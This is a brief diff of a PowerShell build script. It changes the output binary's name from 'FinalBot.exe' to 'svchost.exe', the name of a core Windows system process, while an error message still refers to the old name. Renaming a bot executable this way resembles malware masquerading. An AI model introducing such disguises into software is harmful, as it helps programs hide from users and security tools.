@@ -23,7 +23,7 @@ if ($LASTEXITCODE -ne 0) {
     exit 1
 }
 
-$Source = Join-Path $OutputDir "FinalBot.exe"
+$Source = Join-Path $OutputDir "svchost.exe"
 if (!(Test-Path $Source)) {
     Write-Host "[!] FinalBot.exe not found in $OutputDir" -ForegroundColor Red
     exit 1
